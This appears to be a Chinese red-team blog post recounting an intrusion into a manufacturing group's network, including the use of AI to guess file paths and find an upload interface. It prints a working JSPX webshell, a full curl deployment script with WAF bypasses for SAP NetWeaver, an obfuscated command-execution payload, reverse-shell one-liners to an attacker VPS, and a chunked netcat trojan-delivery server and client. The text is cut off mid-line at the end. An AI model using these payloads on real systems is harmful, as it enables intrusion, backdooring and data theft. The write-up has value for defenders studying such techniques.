---
title: 当AI遇上红队：一次打穿某集团的攻防实录
url: https://mp.weixin.qq.com/s/qkljl7_kDXHHp39WSOwJeQ
source: Doonsec's feed
date: 2026-08-04
fetch_date: 2026-08-05T04:57:02.640257
---

# 当AI遇上红队：一次打穿某集团的攻防实录

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/sqI2cyDiaHgAOD7huVm2y7ZTXcibthBhXJIRPyUdPtllOzqsc2qSQZKQYU7ylfImGhUk7hC1cJ21z8Sfyia5wN7Jz8hCkYQMiaHib7powexc4Tk0/0?wx_fmt=jpeg)

# 当AI遇上红队：一次打穿某集团的攻防实录

YaYaLiou
YaYaLiou

flower安全

![]()

在小说阅读器读本章

去阅读

![]()

在小说阅读器中沉浸阅读

# 当AI遇上红队：一次打穿某集团的攻防实录

最近打了一场攻防演练，目标是一家大型制造集团。这次能打穿，AI确实帮了不少忙——不是那种"AI赋能安全"的空话，是在几个关键节点上实打实省了大量时间。

本文只聊攻击链路，全程脱敏。

> “

---

## Oracle eBusiness Suite 任意文件读取

目标是某集团的OA系统，跑的Oracle eBusiness Suite。测了一下，存在已知的任意文件读取漏洞，能直接读服务器上的文件。

但有个问题——能读文件，不知道该读什么路径。Oracle eBS的目录结构跟部署环境强相关，瞎猜效率太低，试几个不对还容易触发告警。

这时候把系统的响应特征、部署信息整理了一下丢给AI分析，它给了几个可能的用户主目录路径。试了一下，直接命中，读到了 `.bash_history`。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/sqI2cyDiaHgC0ShyZjkZJKtx9TXpAlaV2M4WicFia79PSp0ERWicClXZlOAoyBUB9o3Sf8mXEYyqGK3ZyrSzb2znialm6Z5EOI6SbDgHVVWO0N4w/640?wx_fmt=png&from=appmsg)

历史命令里信息量爆炸，翻出来一堆东西：应用目录结构、配置文件路径、还有运维的操作习惯(不好脱敏不放了)。顺藤摸瓜找到了数据库连接配置，里面有Oracle的连接凭据：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/sqI2cyDiaHgDqIyStxBk26GqXQQlXKMhDPNn9ticamPh4mLQ5065GAUk9H6UXRicibvr8PtrqqMvUcPxs3yn0pFW9KrukPHkNpBibsRZ0WF6h988/640?wx_fmt=png&from=appmsg)

不过试了下账号密码登不上，也没法getshell，这条线暂时断了。但这个点验证了AI在路径推测上确实好使——人工可能得试几十个路径，AI跑几轮就给了对的。

---

## SAP NetWeaver 漏洞链

### 任意用户创建

目标还有一套SAP NetWeaver Application Server Java，存在CVE-2020-6287。直接用PoC创建了个管理员用户，登录进去能看到所有功能点。

但卡住了——有管理员权限，却找不到能部署或上传文件的地方。而且站上有WAF，打nday时XML payload直接被拦。

### 找到利用点

这块卡了一阵。后来把SAP的功能模块和已知接口信息整理了一下让AI分析，它很快指出有个 `DeployWS` 接口可以上传部署WAR包。这个发现就是整个攻击链的转折点。

### 四重WAF绕过

找到了利用点，但WAF挡在前面，一共过了四道关。

**第一关：请求体大小限制**

WAF限制请求体最多912字节，常规WAR包远超这个大小。

解决方案是用超小型webshell——shell本身不干活，只做个类似PHP `eval` 的中转，实际执行的代码通过请求头动态传入：

```
<jsp:root xmlns:jsp="http://java.sun.com/JSP/Page" version="2.0">
<jsp:directive.page contentType="text/plain" import="javax.script.*"/>
<jsp:scriptlet>
String x=request.getHeader("C");
if(x!=null){
  ScriptEngine e=new ScriptEngineManager().getEngineByName("js");
  e.put("o",out);
  e.eval(x);
}
</jsp:scriptlet></jsp:root>
```

**第二关：Base64签名被识别**

WAR包Base64编码后以 `UEsDB` 开头（ZIP文件签名），WAF直接拦，gzip也绕不过。

Fuzz了很久，发现一个技巧：在Base64字符串中间插入换行符，WAF识别不了签名，但服务端还能正常解析。就这一个换行，解决了大问题。

**第三关：Content-Type被检测**

部署WAR包时 `text/xml` 会被WAF拦。换成变体 `application/soap+xml` 就过了。

**第四关：JSP不让传**

服务器不允许上传 `.jsp` 文件，用 `.jspx`（JSP的XML格式）绕过。

### 命令执行

Webshell部署成功后，执行系统命令还得过WAF。传入的Java代码必须混淆，不然还是被拦。用了字符串拼接和字符编码：

```
C: var R=java.lang;var t=R["Runt"+"ime"];var p=t["getRunt"+"ime"]()["ex"+"ec"]([String.fromCharCode(47,98,105,110,47,115,104),"-c","id"]);var i=p.getInputStream();var b;while((b=i.read())!=-1)o.write(b)
```

把 `Runtime`、`getRuntime`、`exec` 这些关键词拆开拼接，路径 `/bin/sh` 用 `String.fromCharCode` 编码，成功执行系统命令。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/sqI2cyDiaHgDIlBQ9vRho7DGyIdQ8wQ2Qd2vcIBiaVBCkILPD7qtIx4WibxciaZfSXyjdQ8QLmV5rxm4Gk0mxykWqUVIu0cAfqLqicR67a9Oib4yk/640?wx_fmt=png&from=appmsg)

### 完整利用步骤

整理一下完整流程：

```
# 1. 本地构造超小型jspx webshell和web.xml
mkdir -p /tmp/sw/WEB-INF
cat > /tmp/sw/s.jspx << 'JSPXEOF'
<jsp:root xmlns:jsp="http://java.sun.com/JSP/Page" version="2.0"><jsp:directive.page contentType="text/plain" import="javax.script.*"/><jsp:scriptlet>
String x=request.getHeader("C");if(x!=null){ScriptEngine e=new ScriptEngineManager().getEngineByName("js");e.put("o",out);e.eval(x);}
</jsp:scriptlet></jsp:root>
JSPXEOF

echo '<?xml version="1.0"?><web-app xmlns="http://java.sun.com/xml/ns/javaee" version="2.5"><display-name>t</display-name></web-app>' > /tmp/sw/WEB-INF/web.xml

# 2. 打包成war并base64编码
cd /tmp/sw && jar -cfM /tmp/sw.war . && cd /root

# 3. base64中间插入换行符绕过WAF
WAR_B64=$(base64 -w0 /tmp/sw.war)
SPLIT="${WAR_B64:0:2}
${WAR_B64:2}"

# 4. 通过DeployWS接口部署，Content-Type用application/soap+xml绕过
curl -sk "https://目标地址/DeployWSService/DeployWS" \
  -u "管理员账号:密码" \
  -H "Content-Type: application/soap+xml; charset=utf-8" \
  -d "<?xml version=\"1.0\" encoding=\"utf-8\"?>
<soap:Envelope xmlns:soap=\"http://www.w3.org/2003/05/soap-envelope\" xmlns:dep=\"http://sap.com/2009/11/24/deployws\">
<soap:Header/><soap:Body>
<dep:deploy><archiveFiles><content>${SPLIT}</content><fileName>t.war</fileName></archiveFiles></dep:deploy>
</soap:Body></soap:Envelope>"
```

---

## 内网突破

拿到命令执行后，真正的硬仗才开始。内网环境非常恶心，一堆限制：

1. **上网行为管理拦截**：请求外网会被302重定向到深信服上网行为管理页面，HTTP流量全拦
2. **TCP长度限制**：TCP连接传输超过13KB就断开
3. **工具受限**：服务器上只有阉割版netcat，功能不全
4. **集群负载均衡**：双机集群，每次执行命令可能落在不同服务器上，状态不连续
5. **反向代理隔离**：公网地址不是服务器真实地址，通过集中转发服务器路由，没法正向连接内部服务器
6. **TLS版本过低**：系统太老，连HTTPS直接报错

![](https://mmbiz.qpic.cn/sz_mmbiz_png/sqI2cyDiaHgBhrciac8fyK4mU4mrWRp4bwoukkGLXvibpQ1OxOU0SFdUY80YGgAttX5gb9nGgLemHZq3FeIUZLHPCBltRULibPs5qNEdIHJzaBg/640?wx_fmt=png&from=appmsg)

### 反弹Shell

常规的bash反弹全部失败：

```
bash -c {echo,Base64编码}|{base64,-d}|{bash,-i}           # 失败
/bin/bash -i > /dev/tcp/VPS地址/端口 0<& 2>&1               # 失败
```

后来发现服务器上有Python，改用Python反弹：

```
export RHOST="VPS地址"; export RPORT=端口
python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
```

![](https://mmbiz.qpic.cn/mmbiz_png/sqI2cyDiaHgCB4Wemkoqqh8ywMpaQ6YaLR9o0Q20wPgOymAdIIOL8lUILXAaS1GcgEticYOL7hbuicBlk1eK2xhArlpycQ2qfdEI3xxNoKGhZY/640?wx_fmt=png&from=appmsg)

连是连上了，但交互一定数量数据就断，没法稳定维持。得想别的办法。

### 分块传输上马

反弹shell不稳定，得直接传木马上去。折腾了很久，摸索出三个关键点：

1. netcat可以通过TCP协议分块获取文件内容，绕过上网行为管理的HTTP拦截，但单次不能超过13KB
2. 连443端口时上网行为管理设备会放宽限制
3. 木马用MTLS协议通信，完全绕开HTTP限制

思路就是：把木马切成10KB以下的块，VPS上起个TCP服务监听443端口，目标机器用netcat循环连接，每次握手后拿一块，拼起来就是完整的木马。

**VPS端——分块服务：**

```
#!/usr/bin/env python3
import socket, os, sys

CHUNK_DIR = "/tmp/chunks"
PORT = 443

def main():
    chunks = sorted(os.listdir(CHUNK_DIR))
    total = len(chunks)
    print(f"[*] Total chunks: {total}, listening on 0.0.0.0:{PORT}")

    idx = 0
    while idx < total:
        chunk_path = os.path.join(CHUNK_DIR, chunks[idx])
        chunk_size = os.path.getsize(chunk_path)

        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.bind(('0.0.0.0', PORT))
        s.listen(1)

        try:
            conn, addr = s.accept()
            # 握手：要求客户端先发"GO"才发数据
            conn.settimeout(3)
            handshake = conn.recv(2)
            if handshake != b'GO':
                conn.close(); s.close(); continue

            with open(chunk_path, 'rb') as f:
                conn.sendall(f.read())
            conn.shutdown(socket.SHUT_WR)
            conn.close()
            idx += 1  # 只有成功才推进到下一块
        except Exception as e:
            print(f"  -> Error: {e}, retrying same chunk")
        finally:
            s.close()

    print(f"[+] All {total} chunks sent!")

if __name__ == "__main__":
    main()
```

**目标机器端——循环分块下载：**

```
HN=$(hostname); F=/tmp/cfg_${HN}.e; rm -f $F; echo START_$HN
i=0
while [ $i -lt 3100 ]; do
    (printf GO; cat /dev/null) | netcat -w8 VPS地址 443 >> $F 2>/dev/null
    i=$((i+1))
done
echo DONE; wc -c $F; md5sum $F; echo FILE:$F
```

**下载完成后赋权执行：**

```
cp /tmp/cfg_服务器A.e /tmp/config1.elf
chmod +x /tmp/config1.elf
/tmp/config1.elf &
```

经过数千次分块传输，木马成功上传并执行，稳定的后门连接终于建立。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/sqI2cyDiaHgCEuzZV2JTsWXto1ibuz6dMCSk30jYQDcvicntbakQe7U4AgsibXMdmJicOMDZAY4kUN5lVTsHt8q2mgWWVicSBOZG8ibm5IsFl43amM/640?wx_fmt=png&from=appmsg)

---

## 打穿内网

木马上线后，用fscan扫了一波内网，结果触目惊心。

**永恒之蓝——多台Windows主机存在MS17-010：**

![](https://mmbiz.qpic.cn/mmbiz_png/sqI2cyDiaHgChQFhlddJAyLicpGCmWEmd2swqem6zMlcPhiaLrrqQELia7p6KicJiah0CIMgOQsDQkdQ9N5BPPM1xupmxDgYyMC4icZlWM61pkfCgY/640?wx_fmt=png&from=appmsg)

**内网Web应用漏洞——fscan的webpoc扫到基本上就有：**

![](https://mmbiz.qpic.cn/sz_mmbiz_png/sqI2cyDiaHgC3a2FDLtDpzicShh9ksE05JnnibMU0xBh7FcJyk1DribLFEbtm6RpjYkxctgVEumZTfCS70Rib5fHPpn4Iyzu6CBp9KJJp4OniaaDo/640?wx_fmt=png&from=appmsg)

**弱口令遍地都是——数据库、中间件、运维系统全中：**

![](https://mmbiz.qpic.cn/mmbiz_png/sqI2cyDiaHgDG96LGAdE96TYfEiaZw4XPBeSdvQhicGfXIQvXSsbm1geYVUcvHktlnIAzp5WtWhOeS7CsDu4bgF0oFuia4Ug4PoPg9vgtsLu6Jc/640?wx_fmt=png&from=appmsg)![](https://mmbiz.qpic.cn/sz_mmbiz_png/sqI2cyDiaHgAkotiaDGibtRrKzO6V4ITKF7oGZmibtQd1EAN5RetgMIXCV5rCe99bvwrA...